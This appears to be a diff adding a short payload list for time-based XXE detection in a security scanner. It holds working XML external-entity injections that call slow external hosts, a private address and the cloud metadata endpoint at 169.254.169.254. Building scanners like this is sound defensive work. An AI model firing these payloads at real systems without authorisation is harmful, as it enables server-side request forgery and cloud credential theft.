@@ -1,0 +1,6 @@
+# Payloads for time-based XXE (XML External Entity) detection.
+# These payloads attempt to access an external resource that is slow to respond.
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://httpbin.org/delay/5"> ]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.255.255.1"> ]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://httpbin.org/delay/7">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
